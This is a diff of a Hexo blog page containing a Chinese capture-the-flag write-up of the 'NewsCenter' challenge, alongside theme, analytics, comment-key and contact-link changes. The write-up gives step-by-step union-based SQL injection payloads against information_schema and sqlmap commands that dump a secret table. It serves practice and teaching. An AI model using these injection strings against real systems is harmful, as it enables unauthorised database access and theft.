@@ -19,10 +19,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>攻防世界-NewsCenter | hybcx&#39;s blog</title>
@@ -268,7 +278,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -325,7 +335,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -420,11 +430,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -444,54 +449,54 @@
 <h3 id="方法一：手工注入">方法一：手工注入</h3>
 <p>这里环境出了问题，怎么刷新也显示不了，就跟着wp走一遍吧</p>
 <p>点进去看到如下页面</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192255610.png" alt="image-20230806192255610"></p>
+<p><img src="image-20230806192255610.png" alt="image-20230806192255610"></p>
 <p>毕竟已经知道是sql注入了，直接看wp分析吧：</p>
 <p>看到数据包最下方有个POST提交的 search =1，看到这里不知道大家想到了什么没有<br>
 (我第一时间是想到了sql注入)<br>
 于是我去尝试，因为search框是能输入字符的所以应该先想他为字符型注入，我比较习惯于用 order by 去判断是否有sql注入<br>
 于是在这里构造search=1’ order by 3 --+，burp suite里发送给repeater</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192426642.png" alt="image-20230806192426642"></p>
+<p><img src="image-20230806192426642.png" alt="image-20230806192426642"></p>
 <p>再尝试search=1’ order by 4 --+</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192436141.png" alt="image-20230806192436141"></p>
+<p><img src="image-20230806192436141.png" alt="image-20230806192436141"></p>
 <p>非常好出现错误了，接下来是利用sql注入的联合查询<br>
 <code> search=-1’ union select 1,2,3 --+</code>  //这里-1是为了不占用回显位</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192502011.png" alt="image-20230806192502011"></p>
+<p><img src="image-20230806192502011.png" alt="image-20230806192502011"></p>
 <p>判断回显位为2,3<br>
 然后search=-1’ union select 1,version(),database() --+<br>
 获取sql版本和当前数据库名</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192538245.png" alt="image-20230806192538245"></p>
+<p><img src="image-20230806192538245.png" alt="image-20230806192538245"></p>
 <p>这里为什么要获取数据库版本呢因为mysql大于5.0以上的版本有一个<br>
 系统数据库information_schema里面的tables表和columns表包含了其他所有的表和列这样我们就可以有据查询<br>
 并且这里知道了当前数据库为news<br>
 然后再构造sql语句</p>
 <pre class="line-numbers language-none"><code class="language-none">search=-1’ union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=‘news’ --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/06/newscenter/image-20230806192605815.png" alt="image-20230806192605815"></p>
+<p><img src="image-20230806192605815.png" alt="image-20230806192605815"></p>
 <p>这里可以看到有两个表news，和secret_table，news应该就是页面上的那些所以我们去找flag要从secret_table表中去找<br>
 再构造sql语句</p>
 <pre class="line-numbers language-none"><code class="language-none">search=-1’ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=‘secret_table’ --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/06/newscenter/image-20230806192628428.png" alt="image-20230806192628428"></p>
+<p><img src="image-20230806192628428.png" alt="image-20230806192628428"></p>
 <p>看到有两个列id,fl4g答案应该就在fl4g里面了<br>
 最后的sql语句</p>
 <pre class="line-numbers language-none"><code class="language-none">search=-1’ union select 1,version(),group_concat(fl4g) from secret_table --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/06/newscenter/image-20230806192652378.png" alt="image-20230806192652378"></p>
+<p><img src="image-20230806192652378.png" alt="image-20230806192652378"></p>
 <h3 id="方法二：sqlmap">方法二：sqlmap</h3>
 <p>搜索框中填入内容，如‘1’，回车搜索抓包，将抓到包的内容保存在txt文档里</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192821010.png" alt="image-20230806192821010"></p>
+<p><img src="image-20230806192821010.png" alt="image-20230806192821010"></p>
 <p>使用sqlmap的-r进行注入如下，其中C:\Users\xxx\Desktop\1.txt为保存数据包的txt文件绝对路径</p>
 <p>#查找数据库<br>
 <a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” --dbs</p>
 <p>#或查找当前数据库<br>
 <a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” --current-dbs</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192839665.png" alt="image-20230806192839665"></p>
+<p><img src="image-20230806192839665.png" alt="image-20230806192839665"></p>
 <p>#查找news数据库中的表<br>
 <a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” -D news --tables</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192851775.png" alt="image-20230806192851775"></p>
+<p><img src="image-20230806192851775.png" alt="image-20230806192851775"></p>
 <p>#查找secret_table表中的列<br>
 <a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” -D news -T serect_table --columns</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192900777.png" alt="image-20230806192900777"></p>
+<p><img src="image-20230806192900777.png" alt="image-20230806192900777"></p>
 <p>#查找fl4g列中的字段（内容），出现flag<br>
 <a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” -D news -T serect_table -C fl4g --dump</p>
-<p><img src="/2023/08/06/newscenter/image-20230806192909863.png" alt="image-20230806192909863"></p>
+<p><img src="image-20230806192909863.png" alt="image-20230806192909863"></p>
 <p>怎么说，没有过滤，很新手</p>
 <h2 id="参考文章：">参考文章：</h2>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/trytowritecode/article/details/120709275?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131919616800215026970%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131919616800215026970&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-120709275-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=NewsCenter&amp;spm=1018.2226.3001.4187">方法一参考</a></p>
@@ -586,7 +591,7 @@
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -594,7 +599,7 @@
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -874,12 +879,12 @@
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1008,6 +1013,8 @@
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1035,8 +1042,8 @@
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1119,8 +1126,6 @@
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1140,24 +1145,28 @@
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1369,8 +1378,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
